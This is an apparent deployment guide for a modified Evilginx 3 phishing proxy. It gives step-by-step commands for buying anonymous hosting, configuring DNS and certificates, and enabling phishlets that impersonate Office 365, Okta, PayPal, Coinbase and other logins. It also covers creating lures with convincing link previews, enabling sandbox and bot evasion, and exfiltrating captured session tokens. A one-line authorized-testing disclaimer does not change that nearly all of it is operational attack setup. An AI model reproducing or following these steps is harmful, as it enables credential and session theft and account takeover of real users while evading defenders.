# 🚀 Evilginx 3.3.1 Private Dev Edition - Complete Deployment Guide

> **⚠️ LEGAL DISCLAIMER**: This guide is for **AUTHORIZED PENETRATION TESTING AND RED TEAM ENGAGEMENTS ONLY**. Unauthorized use is illegal. Always obtain written permission before conducting security assessments.

---

## 📑 Table of Contents

1. [Prerequisites](#1-prerequisites)
2. [VPS Selection & Setup](#2-vps-selection--setup)
3. [Domain Configuration](#3-domain-configuration)
4. [Server Preparation](#4-server-preparation)
5. [Installation](#5-installation)
   - [Clone Repository](#51-clone-repository)
   - [Linux Automated Installer](#52-linux-automated-installer-recommended)
   - [Windows Automated Installer](#53-windows-automated-installer)
   - [Manual Installation](#54-manual-installation)
   - [Docker Installation](#55-docker-installation-experimental)
6. [SSL/TLS Certificate Setup](#6-ssltls-certificate-setup)
7. [Phishlet Configuration](#7-phishlet-configuration)
8. [Redirector Setup (Turnstile)](#8-redirector-setup-turnstile)
9. [Lure Creation & Distribution](#9-lure-creation--distribution)
10. [Advanced Features & Evasion](#10-advanced-features--evasion)
11. [Operational Security](#11-operational-security)
12. [Troubleshooting](#12-troubleshooting)

---

## 1. Prerequisites

### Required Resources

**Infrastructure:**
- **VPS (Linux)**: Minimum 2GB RAM, 2 CPU cores, 20GB storage (Ubuntu 20.04+/Debian 11+ recommended).
- **Windows Host**: Windows 10/11 or Server 2016+ (if deploying on Windows).
- **Domain Name**: For phishing and redirectors.
- **Cloudflare Account**: Free tier is sufficient.
- **Access**: SSH (Linux) or Administrator Access (Windows).
- **Ports**: 80 (HTTP), 443 (HTTPS), 53 (UDP/DNS) must be available.

**Knowledge Requirements:**
- Basic command line usage.
- Understanding of DNS records.
- Authorization documentation for red team engagement.

---

## 2. VPS Selection & Setup

### Recommended Providers

| Provider | Pros | Cons | Starting Price |
|----------|------|------|----------------|
| **DigitalOcean** | Easy setup, good docs | Popular (may be flagged) | $6/month |
| **Vultr** | Good performance, flexible | Limited regions | $6/month |
| **Linode** | Reliable, established | Moderate pricing | $5/month |
| **Njalla** | Anonymous/Crypto | Higher cost | Varies |

**Selection Criteria:**
- ✅ Accept cryptocurrency/privacy-focused payment.
- ✅ Don't require extensive KYC.
- ✅ Allow port 80/443 traffic.
- ✅ Located near target audience.

### Initial Access (Linux)

```bash
# Connect via SSH
ssh root@YOUR_VPS_IP

# Update system
sudo apt update && sudo apt upgrade -y

# Configure firewall basics
ufw allow 22/tcp    # SSH
ufw allow 80/tcp    # HTTP
ufw allow 443/tcp   # HTTPS
ufw allow 53/udp    # DNS
ufw enable
```

---

## 3. Domain Configuration

### Cloudflare Setup

1. **Add Domain to Cloudflare:**
   - Sign up at cloudflare.com.
   - Add your domain and select the **Free** plan.
   - Update your registrar's nameservers to the ones provided by Cloudflare.

2. **DNS Records:**

   Add the following records in Cloudflare. **CRITICAL: Set Proxy Status to "DNS only" (Enable the Gray Cloud, Disable the Orange Cloud).**

   | Type | Name | Content | Proxy Status |
   |------|------|---------|--------------|
   | A | @ | YOUR_VPS_IP | **DNS only (Gray)** |
   | A | login | YOUR_VPS_IP | **DNS only (Gray)** |
   | A | www | YOUR_VPS_IP | **DNS only (Gray)** |
   | A | * | YOUR_VPS_IP | **DNS only (Gray)** |
   | NS | @ | ns1.yourdomain.com | - |
   | NS | @ | ns2.yourdomain.com | - |

   *Note: For the NS records, point them to your own domain if using Evilginx as a Nameserver, or rely on Cloudflare's management if using only simple A records.*

3. **SSL/TLS Settings:**
   - Go to **SSL/TLS** -> **Edge Certificates**.
   - Enable **Always Use HTTPS**.
   - Set Minimum TLS Version to **1.2**.

---

## 4. Server Preparation

Before installing, ensure no other services are using ports 80, 443, or 53.

```bash
# Check ports
sudo netstat -tulpn | grep ':80\|:443\|:53'

# Stop conflicting services (examples)
sudo systemctl stop apache2
sudo systemctl disable apache2
sudo systemctl stop nginx
sudo systemctl disable nginx
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved

# Fix DNS resolution after stopping systemd-resolved
echo "nameserver 1.1.1.1" | sudo tee /etc/resolv.conf
```

---

## 5. Installation

### 5.1 Clone Repository

```bash
# Create directory
mkdir -p ~/phishing
cd ~/phishing

# Clone Evilginx3 (Private Dev Edition)
git clone https://github.com/0fukuAkz/Evilginx3.git
cd Evilginx3
```

### 5.2 Linux Automated Installer (Recommended)

For Ubuntu/Debian systems, use the included install script for a complete setup.

```bash
chmod +x install.sh
sudo ./install.sh
```

**The installer automatically:**
- ✅ Installs dependencies (Go, git, etc.)
- ✅ Builds Evilginx from source
- ✅ Configures Firewall (UFW)
- ✅ Creates `evilginx` systemd service
- ✅ Creates helper aliases (`evilginx-start`, `evilginx-console`)

**Post-install commands:**
```bash
evilginx-console    # Configure interactively
evilginx-start      # Start background service
evilginx-status     # Check status
evilginx-logs       # Monitor logs
```

### 5.3 Windows Automated Installer

For Windows 10/11 or Server 2016+.

```powershell
# Open PowerShell as Administrator
cd C:\Users\user\Desktop\Projects\git\Evilginx3
.\install-windows.ps1
```

**The installer automatically:**
- ✅ Installs Go 1.22 (if missing)
- ✅ Builds from source
- ✅ Installs NSSM and creates a Windows Service
- ✅ Configures Windows Firewall
- ✅ Creates helper aliases

**Post-install commands:**
```powershell
evilginx-console    # Configure interactively
evilginx-start      # Start Windows service
evilginx-logs       # Monitor logs
```

### 5.4 Manual Installation

If you prefer to build manually:

```bash
# Install Go (Linux)
wget https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin

# Build
cd Evilginx3
go mod download
go build -o build/evilginx main.go

# Install
sudo cp build/evilginx /usr/local/bin/
sudo chmod +x /usr/local/bin/evilginx

# Create config dirs
mkdir -p ~/.evilginx/phishlets
mkdir -p ~/.evilginx/redirectors
cp -r phishlets/* ~/.evilginx/phishlets/
cp -r redirectors/* ~/.evilginx/redirectors/
```

### 5.5 Docker Installation (Experimental)

```bash
# Build image
docker build -t evilginx3 .

# Run container
docker run -it \
  -p 443:443 -p 80:80 -p 53:53/udp \
  -v $(pwd)/phishlets:/app/phishlets \
  -v ~/.evilginx:/root/.evilginx \
  evilginx3
```

---

## 6. SSL/TLS Certificate Setup

Evilginx3 uses **CertMagic** for automatic certificate management via Let's Encrypt.

1. **Start Evilginx:**
   ```bash
   sudo evilginx
   ```

2. **Configure Domain & IP:**
   ```bash
   config domain yourdomain.com
   config ipv4 YOUR_VPS_IP
   ```

Certificates will be automatically requested and installed for any phishlet hostname you enable.

**Troubleshooting:**
If certs fail, ensure ports 80/443 are open and your DNS A records point to the VPS IP.

---

## 7. Phishlet Configuration

### Available Phishlets
Includes 13 debugged phishlets: `amazon`, `apple`, `booking`, `coinbase`, `facebook`, `instagram`, `linkedin`, `netflix`, `o365`, `okta`, `paypal`, `salesforce`, `spotify`.

### Enabling a Phishlet

```bash
# List phishlets
phishlets

# Configure hostname (e.g., Office 365)
phishlets hostname o365 login.yourdomain.com

# Enable
phishlets enable o365
```

---

## 8. Redirector Setup (Turnstile)

Redirectors add a layer of legitimacy and bot protection using Cloudflare Turnstile.

### Step 1: Get Turnstile Keys
1. Go to Cloudflare Dashboard > Turnstile.
2. Create a Site.
   - Mode: **Managed** (or Invisible).
   - Domain: `yourdomain.com` (or the domain hosting the redirector).
3. Copy **Site Key** and **Secret Key**.

### Step 2: Configure Redirector
1. Go to `redirectors/o365_turnstile/` (or matching phishlet name).
2. Edit `index.html`:
   - Replace `YOUR_TURNSTILE_SITE_KEY` with your actual Site Key.
3. Edit the redirect target in `index.html` (Javascript section):
   ```javascript
   window.location.href = 'https://login.yourdomain.com/LURE_PATH';
   ```

### Step 3: Deploy Redirector
You can host the redirector on:
- **Cloudflare Pages / GitHub Pages** (Recommended for separation).
- **Subdomain** on your VPS.

---

## 9. Lure Creation & Distribution

Lures are the unique links you send to targets.

```bash
# Create lure for enabled phishlet
lures create o365

# Edit lure to set redirect URL (where they go AFTER fishing)
lures edit 0 redirect_url https://www.office.com

# (Optional) Set OpenGraph info for nice link previews
lures edit 0 og_title "Account Security Verification"
lures edit 0 og_image https://example.com/logo.png

# Get the phishing URL
lures get-url 0
```

---

## 10. Advanced Features & Evasion

This Private Dev Edition references `config.json` for advanced settings.

### Configuration Reference (`~/.evilginx/config.json`)

```json
{
  "ml_detection": {
    "enabled": true,
    "threshold": 0.75,
    "learning_mode": true
  },
  "ja3_fingerprinting": {
    "enabled": true,
    "block_known_bots": true
  },
  "sandbox_detection": {
    "enabled": true,
    "mode": "active",
    "action_on_detection": "redirect"
  },
  "polymorphic_engine": {
    "enabled": true,
    "mutation_level": "high",
    "seed_rotation": 15
  },
  "traffic_shaping": {
    "enabled": true,
    "per_ip_rate_limit": 100,
    "ddos_protection": true
  }
}
```

**Commands:**
```bash
config ml_detection on
config ja3_detection on
config polymorphic on
```

---

## 11. Operational Security

1. **Infrastructure Isolation**: Never reuse campaign infrastructure. Use fresh VPS and Domains for each engagement.
2. **Access Control**: whitelist your IP for SSH access using `ufw`.
3. **Data Handling**: Exfiltrate captured session tokens securely and destroy data on the VPS after the engagement.

---

## 12. Troubleshooting

**Issue: "Port 443 already in use"**
```bash
sudo lsof -i :443
# Kill the process or stop the service
```

**Issue: Certificates not generating**
- Verify DNS propagation (`dig A login.yourdomain.com`).
- Disable conflicting services (nginx/apache).
- Try `config autocert off` for debugging.

**Issue: "lures can't read turnstile data"**
- This is often harmless (browser requesting icons/manifests). The automated installer includes default files to minimize this.

**Issue: Sessions not capturing**
- Run in debug mode: `./build/evilginx -debug -p ./phishlets` to see raw traffic logs.
